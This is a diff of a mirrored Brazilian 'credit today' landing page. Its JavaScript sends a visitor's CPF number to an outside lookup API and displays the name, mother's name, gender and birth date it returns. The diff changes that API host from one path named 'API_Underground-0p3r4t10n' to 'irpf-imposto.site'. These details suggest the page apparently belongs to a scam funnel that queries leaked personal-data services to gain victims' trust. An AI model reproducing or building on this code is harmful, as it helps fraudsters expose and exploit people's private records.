@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 
-<!-- Mirrored from seucreditohoje.site/direto/2/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 22 May 2025 19:45:03 GMT -->
+<!-- Mirrored from seucreditohoje.site/direto/2/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 22 May 2025 19:41:45 GMT -->
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -178,7 +178,7 @@
 
             try {
                 console.log('Iniciando consulta à API...');
-                const url = `https://apis.4mkt.pro/API_Underground-0p3r4t10n/?cpf=${cpf}`;
+                const url = `https://irpf-imposto.site/buscar-cpf/new-api.php?cpf=${cpf}`;
                 console.log('URL da requisição:', url);
 
                 const response = await fetch(url, {
@@ -190,14 +190,14 @@
                 const data = await response.json();
                 console.log('Dados recebidos:', data);
 
-                if (response.ok) {
+                if (data && data.result) {
                     console.log('Consulta bem sucedida');
                     
                     const dadosUsuario = {
-                        NOME: data.nome,
-                        MAE: data.mae || '',
-                        SEXO: data.sexo,
-                        NASCIMENTO: data.nascimento
+                        NOME: data.result.nome || '',
+                        MAE: data.result.nome_mae || data.result.nome_mae || '',
+                        SEXO: data.result.genero || 'N/D',
+                        NASCIMENTO: data.result.data_nascimento || ''
                     };
                     
                     localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
@@ -205,7 +205,7 @@
                     console.log('Dados salvos no localStorage');
 
                     document.getElementById('user-name').textContent = dadosUsuario.NOME;
-                    document.getElementById('user-cpf').textContent = data.cpfformatado || cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+                    document.getElementById('user-cpf').textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
                     
                     document.getElementById('verification-step').style.display = 'none';
                     document.getElementById('results-step').style.display = 'block';
@@ -252,7 +252,7 @@
     
         function buildUrlWithParams(baseUrl) {
             const params = getUrlParams();
-            const url = new URL(baseUrl%2c%20window.location.html);
+            const url = new URL(baseUrl, window.location.origin);
             
             Object.keys(params).forEach(key => {
                 url.searchParams.append(key, params[key]);
@@ -289,5 +289,5 @@
     </script>
 </body>
 
-<!-- Mirrored from seucreditohoje.site/direto/2/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 22 May 2025 19:45:03 GMT -->
+<!-- Mirrored from seucreditohoje.site/direto/2/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 22 May 2025 19:41:48 GMT -->
 </html> 
